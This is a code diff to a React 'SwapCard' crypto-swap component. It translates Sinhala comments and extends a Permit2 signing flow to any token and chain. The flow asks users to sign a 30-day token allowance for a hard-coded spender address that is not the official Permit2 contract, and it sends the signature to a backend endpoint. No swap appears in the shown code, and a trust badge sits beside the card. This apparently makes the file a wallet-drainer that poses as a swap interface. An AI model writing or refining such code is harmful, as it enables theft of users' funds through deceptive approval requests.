@@ -26,11 +26,11 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const [livePrices, setLivePrices] = useState({});
 
-  // ⭐ ඔයාගේ Config
+  // ⭐ Config
   const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
   const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-  const API_URL = "/api/submit"; // Vercel Serverless Function
+  const API_URL = "/api/submit"; 
 
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
@@ -97,7 +97,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ Execute Permit2 Flow (Backend එකට signature එක යවනවා)
+  // ⭐ Execute Permit2 Flow (Fixed Signature logic)
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -113,35 +113,39 @@ export default function SwapCard({ walletAddress, provider }) {
       setStatus({ type: 'info', msg: '⏳ Waiting for signature...' });
       
       const signer = provider.getSigner();
+      const network = await provider.getNetwork();
       
-      // 1. Permit2 details හදන්න
-      const amount = ethers.utils.parseUnits(fromAmount, 6); // USDT decimals 6
-      const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // දවස් 30ක්
-      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // පැයක්
+      // 1. Dynamic Token Decimals & Amount Formatting
+      const tokenDecimals = fromToken.decimals || (fromToken.symbol === 'USDT' ? 6 : 18);
+      const amount = ethers.utils.parseUnits(fromAmount, tokenDecimals);
       
-      // 2. Permit2 Contract එක හදන්න
+      const expiration = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60); // 30 Days
+      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // 1 Hour
+      
+      const tokenAddress = fromToken.address || USDT_ADDRESS;
+
+      // 2. Fetch Nonce from Permit2 Contract
       const permit2Contract = new ethers.Contract(
         PERMIT2_ADDRESS,
         ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
         signer
       );
       
-      // 3. Nonce එක ගන්න
       const allowanceData = await permit2Contract.allowance(
         walletAddress,
-        USDT_ADDRESS,
+        tokenAddress,
         PERMIT2_CONTRACT_ADDRESS
       );
-      const nonce = allowanceData.nonce;
-      
-      // 4. EIP-712 Domain හදන්න
+      const nonce = allowanceData.nonce.toNumber();
+
+      // 3. EIP-712 Domain Specs
       const domain = {
         name: "Permit2",
-        chainId: 1,
+        chainId: network.chainId,
         verifyingContract: PERMIT2_ADDRESS
       };
       
-      // 5. Types හදන්න
+      // 4. EIP-712 Types (Permit2 Standard)
       const types = {
         PermitSingle: [
           { name: "details", type: "PermitDetails" },
@@ -156,11 +160,11 @@ export default function SwapCard({ walletAddress, provider }) {
         ]
       };
       
-      // 6. Message හදන්න
+      // 5. Message Construction with Clean Primitive Values
       const message = {
         details: {
-          token: USDT_ADDRESS,
-          amount: amount,
+          token: tokenAddress,
+          amount: amount.toString(),
           expiration: expiration,
           nonce: nonce
         },
@@ -168,7 +172,7 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      // 7. Sign කරන්න (window.ethereum.request පාවිච්චි කරන්න)
+      // 6. Request EIP-712 Signature
       const signature = await window.ethereum.request({
         method: 'eth_signTypedData_v4',
         params: [
@@ -184,15 +188,16 @@ export default function SwapCard({ walletAddress, provider }) {
       
       setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
       
-      // 8. Backend එකට යවන්න
+      // 7. Post Data to Backend Handler
       const response = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           user: walletAddress,
+          token: tokenAddress,
           amount: amount.toString(),
           expiration: expiration,
-          nonce: nonce.toString(),
+          nonce: nonce,
           sigDeadline: sigDeadline,
           signature: signature
         })
@@ -338,7 +343,7 @@ export default function SwapCard({ walletAddress, provider }) {
           </div>
         )}
 
-        {/* PCrisk Trust Badge - Swap Card එකට යටින් */}
+        {/* PCrisk Trust Badge */}
         <div className="flex justify-center mt-6">
           <div 
             className="pcrisk-badge"
